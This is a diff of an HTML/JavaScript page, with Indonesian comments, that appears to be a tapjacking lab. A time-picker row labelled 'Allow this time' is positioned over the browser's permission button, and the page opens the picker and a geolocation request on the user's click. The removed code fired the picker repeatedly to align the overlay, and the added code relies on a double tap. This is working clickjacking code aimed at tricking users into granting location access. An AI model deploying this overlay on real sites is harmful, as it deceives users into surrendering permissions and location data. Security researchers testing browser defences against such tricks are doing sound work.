@@ -3,7 +3,7 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Precision Overlay Alignment Lab</title>
+    <title>Tapjacking & Double-Tap Lab</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
@@ -48,17 +48,15 @@
 </head>
 <body>
 
-    <h1>⚠️ Precision Overlay Alignment Lab</h1>
-    <p style="font-size: 12px; color: #888;">Penyesuaian posisi baris picker agar presisi menutupi tombol asli.</p>
+    <h1>⚠️ Double-Tap Interaction Lab</h1>
+    <p style="font-size: 12px; color: #888;">Simulasi pengujian respons klik ganda terhadap kemunculan dialog izin.</p>
 
     <div class="interactive-zone">
         <input id="input" type="time" list="times" style="display:none;" />
         <datalist id="times">
             <select>
-                <!-- Menambahkan opsi di atas untuk menggeser posisi baris aktif ke bawah -->
                 <option label="--">00:00</option>
                 <option label="--">00:01</option>
-                <!-- Baris tengah target yang akan sejajar dengan tombol asli -->
                 <option label="        Allow this time        ">00:02</option>
                 <option label="--">00:03</option>
                 <option label="--">00:04</option>
@@ -67,7 +65,7 @@
     </div>
 
     <div class="info-box" id="log-box">
-        <strong>Status Log:</strong> Menunggu interaksi klik/sentuh...
+        <strong>Status Log:</strong> Menunggu interaksi klik...
     </div>
 
 <script>
@@ -78,47 +76,27 @@
         logBox.innerHTML += `<br>[${new Date().toLocaleTimeString()}] ${msg}`;
     }
 
-    function showList() {
-        try {
-            navigator.permissions.query({ name: 'geolocation' }).then(permissionStatus => {
-                if (permissionStatus.state === 'granted') {
-                    appendLog("Izin geolokasi sudah aktif.");
-                    return;
-                }
-                input.showPicker();
-                appendLog("Berhasil memicu showPicker()");
-            }).catch(err => {
-                appendLog("Error permissions: " + err.message);
-            });
-        } catch (e) {
-            appendLog("[BLOCKED/DITOLAK]: " + e.message);
-        }
-    }
+    let clickCount = 0;
 
     document.body.onclick = async () => {
-        appendLog("Gestur pengguna terdeteksi. Menjalankan pemicuan kilat...");
-        
-        // Eksekusi instan pertama
-        showList();
+        clickCount++;
+        appendLog(`Ketukan ke-${clickCount} terdeteksi.`);
 
-        // Pemicuan beruntun dengan interval ketat untuk menguji respons antarmuka
-        let rapidCount = 0;
-        const rapidInterval = setInterval(() => {
-            rapidCount++;
-            appendLog(`Pemicuan cepat ke-${rapidCount}`);
-            showList();
-            
-            if (rapidCount >= 4) {
-                clearInterval(rapidInterval);
-                appendLog("Siklus pemicuan cepat selesai.");
-            }
-        }, 120);
+        try {
+            // Memanggil showPicker berdasarkan validasi token aktivasi
+            input.showPicker();
+            appendLog("showPicker() berhasil dipicu pada ketukan ini.");
+        } catch (e) {
+            appendLog("[Ditolak oleh Sistem]: " + e.message);
+        }
 
-        // Memanggil geolocation secara asinkron paralel untuk memunculkan dialog sistem
-        navigator.geolocation.getCurrentPosition(
-            (pos) => { appendLog("Geolokasi diberikan: " + pos.coords.latitude); },
-            (err) => { appendLog("Geolokasi diabaikan/ditolak: " + err.message); }
-        );
+        // Memanggil geolokasi untuk memunculkan dialog izin sistem
+        if (clickCount === 1) {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => { appendLog("Geolokasi diizinkan: " + pos.coords.latitude); },
+                (err) => { appendLog("Geolokasi ditolak/error: " + err.message); }
+            );
+        }
     };
 </script>
 
